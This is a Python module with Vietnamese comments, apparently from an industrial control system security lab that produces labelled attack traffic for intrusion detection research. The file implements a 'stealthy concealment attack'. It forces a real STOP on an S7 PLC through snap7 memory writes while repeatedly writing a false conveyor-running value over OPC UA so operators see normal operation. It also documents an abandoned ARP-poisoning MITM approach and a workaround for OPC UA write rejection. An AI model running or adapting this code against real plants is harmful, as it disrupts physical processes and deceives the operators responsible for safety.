"""
CONCEALED_STOP_ATTACK
Ket hop 2 diem tan cong thanh 1 kich ban "stealthy concealment attack" dung
nghia theo Urbina et al., "Limiting the Impact of Stealthy Attacks on
Industrial Control Systems" (ACM CCS 2016): tan cong actuator that + DONG
THOI gia mao sensor feedback de che giau hieu ung khoi operator/IDS.

LICH SU THIET KE (giu lai de khong lap lai sai lam):
Ban dau che gia tri bang MITM (ARP poison + sua goi OPC UA tren day, xem git
history / tests/test_mitm_opcua_spoof.py). Da bi loai bo: sau khi vá xong bug
attacker MAC rong (get_if_hwaddr tren Npcap tra ve MAC rong), ARP poison van
gui duoc goi that (xac nhan qua diag_arp_redirect.py: 44 poison packets, MAC
hop le) nhung intercepted=0 O CA 3 LAN CHAY -- PLC/HMI khong chap nhan ARP
reply khong duoc yeu cau (gratuitous ARP), rat co the la hardening co chu
dich cua stack mang cong nghiep, khong sua duoc bang code va khong the chan
doan tiep vi khong co quyen truy cap truc tiep PLC/HMI de kiem tra arp -a.

Ban hien tai: BO HAN MITM/ARP, ghi gia tri gia THANG qua chinh giao thuc OPC
UA (asyncua, cung thu vien Day 8 dang dung), khong can quyen mang dac biet.

QUAN TRONG -- khac gi voi OPCUA_MALICIOUS_WRITE (Day 8) va stage5_fake_display
cu (da go khoi kill_chain.py vi trung lap)? Ca hai deu dung CO CHE giong nhau
(OPC UA write). Diem khac la Ở TANG Y NGHIA, khong phai tang cong cu:
  - OPCUA_MALICIOUS_WRITE: ghi 1 gia tri sai vao 1 node (Nhap, KHONG PHAI
    BangTai), DUNG MOT MINH, khong dieu kien, khong gan voi hanh dong nao khac.
  - stage5_fake_display (da go): ghi gia tri gia vao BangTai/HienThi DUNG MOT
    MINH, khong dieu kien theo trang thai PLC that.
  - Module nay: CHI ghi gia khi da phat hien dung luc "vat dang van chuyen"
    (dieu kien nhu logic_aware.py), VA chi trong dung KHOANG THOI GIAN mot
    STOP that dang dien ra qua S7 (dong bo hai diem tan cong), tat di ngay
    khi restart that. Day la "multi-point coordinated attack" (Adepu & Mathur,
    COMPSAC 2016) -- phoi hop actuator+sensor co dieu kien, khac ban chat voi
    1 probe don le du dung chung API.

GIOI HAN THAT, CHUA CHAC CHAN (khong phong dai): config/opcua_tags.yaml danh
dau BangTai la writable: false. Day chi la co flag muc UNG DUNG (web_scada tu
gioi han UI), KHONG chac chan phan anh dung AccessLevel that o tang giao thuc
OPC UA -- CO THE server tu choi thang (BadNotWritable/BadUserAccessDenied),
hoac chap nhan ghi nhung PLC tu lam moi gia tri that moi chu ky scan roi de
lai gia tri that gan nhu ngay lap tuc. Module nay PROBE 1 LAN truoc khi chay
toan bo kich ban de bao ro ket qua thay vi chay mu roi moi biet fail.

Goi tu bash:
  python -m attacks_ext.concealed_stop_attack \
      --target 192.168.210.211 --rack 0 --slot 1 \
      --opc-url opc.tcp://192.168.210.211:4840 \
      --duration 30 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import asyncio
import threading
import time
from attacks_ext.config_ext import base_parser, write_label

import snap7
try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas
from snap7.util import get_bool, set_bool, get_dint

from asyncua import Client, ua

BANGTAI_NODE_ID = 'ns=3;s="BangTai"'
CONCEAL_WRITE_INTERVAL_S = 0.15  # ghi lien tuc trong cua so STOP, phong truong hop PLC tu lam moi gia tri that

concealment_active = threading.Event()
stop_all = threading.Event()
probe_result = {}  # {"writable": bool, "error": str|None} -- dien boi probe_bangtai_writable()


def read_cd1(client) -> int:
    return get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)


async def write_value_only(node, value: bool) -> None:
    """asyncua's Node.write_value() always attaches SourceTimestamp (see
    asyncua.common.ua_utils.value_to_datavalue) -- the S7-1500 OPC UA server
    rejects that with BadWriteNotSupported ("does not support writing the
    combination of value, status and timestamps provided"). Build a DataValue
    with ONLY Value set (StatusCode/SourceTimestamp/ServerTimestamp all None)
    and pass it straight through -- value_to_datavalue leaves an existing
    ua.DataValue untouched, so this bypasses the auto-timestamp entirely."""
    dv = ua.DataValue(
        Value=ua.Variant(value, ua.VariantType.Boolean),
        StatusCode=None,
        SourceTimestamp=None,
        ServerTimestamp=None,
    )
    await node.write_value(dv)


async def probe_bangtai_writable(opc_url: str) -> None:
    """Thu ghi 1 lan (giu nguyen gia tri hien tai, chi ghi lai chinh no) de
    biet server co cho ghi BangTai khong TRUOC KHI chay toan bo kich ban --
    tranh chay mu 30s roi moi biet writable=false. Ket qua ghi vao
    probe_result de run() doc va quyet dinh co tiep tuc khong."""
    try:
        async with Client(url=opc_url, timeout=5) as client:
            node = client.get_node(BANGTAI_NODE_ID)
            current = await node.read_value()
            await write_value_only(node, current)
            probe_result["writable"] = True
            probe_result["error"] = None
            print(f"[+] Probe: BangTai chap nhan ghi (gia tri hien tai={current})")
    except Exception as e:
        probe_result["writable"] = False
        probe_result["error"] = f"{type(e).__name__}: {e}"
        print(f"[!] Probe: BangTai TU CHOI ghi -- {probe_result['error']}")


async def opcua_conceal_loop(opc_url: str, stats: dict) -> None:
    """Chay song song voi luong S7: khi concealment_active dang bat, LIEN TUC
    ghi True vao BangTai (khong chi 1 lan) vi khong biet chac PLC co tu lam
    moi gia tri nay moi chu ky scan hay khong -- ghi lai lien tuc de toi da
    hoa co hoi gia tri gia "dinh" duoc trong cua so ngan."""
    stats["attempts"] = 0
    stats["succeeded"] = 0
    stats["failed"] = 0
    try:
        async with Client(url=opc_url, timeout=5) as client:
            node = client.get_node(BANGTAI_NODE_ID)
            print(f"[+] OPC UA concealment channel connected: {opc_url}")
            while not stop_all.is_set():
                if concealment_active.is_set():
                    stats["attempts"] += 1
                    try:
                        await write_value_only(node, True)
                        stats["succeeded"] += 1
                    except Exception as e:
                        stats["failed"] += 1
                        if stats["failed"] <= 3:  # tranh spam log neu loi lap lai moi 0.15s
                            print(f"[WARN] Concealment write that bai: {type(e).__name__}: {e}")
                await asyncio.sleep(CONCEAL_WRITE_INTERVAL_S)
    except Exception as e:
        print(f"[ERR] OPC UA concealment loop: {e}")
    finally:
        stop_all.set()


def s7_attack_loop(args, result: dict) -> None:
    """Chay trong thread rieng: doc CD1, khi phat hien dung luc "vat dang van
    chuyen" thi BAT concealment_active TRUOC, ghi STOP=True/START=False that,
    giu 6s, restart that, TAT concealment_active. Luon restore START/STOP goc
    trong finally du thoat kieu gi."""
    client = snap7.client.Client()
    stop_count = 0
    original = None
    try:
        client.connect(args.target, args.rack, args.slot)
        print("[+] S7 foothold connected -- monitoring CD1 for transport window...")
        m5_orig = client.read_area(Areas.MK, 0, 5, 1)
        original = {"START": get_bool(m5_orig, 0, 0), "STOP": get_bool(m5_orig, 0, 1)}

        end_time = time.time() + args.duration
        while time.time() < end_time and not stop_all.is_set():
            m5 = client.read_area(Areas.MK, 0, 5, 1)
            is_stop = get_bool(m5, 0, 1)
            cd1 = read_cd1(client)

            if cd1 > 0 and cd1 < 30000 and not is_stop:
                concealment_active.set()
                time.sleep(0.3)  # cho vai lan ghi conceal truoc khi STOP that co hieu luc

                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 1, True)
                set_bool(m5, 0, 0, False)
                client.write_area(Areas.MK, 0, 5, m5)
                stop_count += 1
                print(f"  [{stop_count}] STOP that (CD1={cd1}ms) + concealment ON (dang ghi lai BangTai=True qua OPC UA)")

                time.sleep(6)

                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 1, False)
                set_bool(m5, 0, 0, True)
                client.write_area(Areas.MK, 0, 5, m5)
                time.sleep(1)
                concealment_active.clear()
                print(f"  [{stop_count}] Restart that -- concealment OFF")

            time.sleep(2)

    except Exception as e:
        print(f"[ERR] S7 loop: {e}")
    finally:
        concealment_active.clear()
        if original is not None and client.get_connected():
            try:
                m5 = client.read_area(Areas.MK, 0, 5, 1)
                set_bool(m5, 0, 0, original["START"])
                set_bool(m5, 0, 1, original["STOP"])
                client.write_area(Areas.MK, 0, 5, m5)
                print(f"[*] Restored START={original['START']} STOP={original['STOP']}")
            except Exception as e:
                print(f"[ERR] Restore that bai, can khoi phuc thu cong: {e}")
        if client.get_connected():
            client.disconnect()
        stop_all.set()
        result["stop_count"] = stop_count


def run(args):
    label_prefix = "CONCEALED_STOP_ATTACK"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target} opc_url={args.opc_url}")

    asyncio.run(probe_bangtai_writable(args.opc_url))
    if not probe_result.get("writable"):
        print("[ERR] BangTai khong the ghi qua OPC UA -- huy, khong chay S7 attack (tranh STOP that ma khong che giau duoc).")
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"aborted=probe_failed error={probe_result.get('error')}")
        return

    result = {}
    conceal_stats = {}
    s7_thread = threading.Thread(target=s7_attack_loop, args=(args, result), daemon=True)
    s7_thread.start()

    try:
        asyncio.run(opcua_conceal_loop(args.opc_url, conceal_stats))
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        stop_all.set()
        s7_thread.join(timeout=10)
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=(f"stops={result.get('stop_count', 0)} "
                          f"conceal_attempts={conceal_stats.get('attempts', 0)} "
                          f"conceal_ok={conceal_stats.get('succeeded', 0)} "
                          f"conceal_failed={conceal_stats.get('failed', 0)}"))


def main():
    p = base_parser("Concealed Stop Attack (S7 actuator STOP + OPC UA sensor concealment, Urbina et al. CCS16 style)")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    p.add_argument("--opc-url", default="opc.tcp://192.168.210.211:4840")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
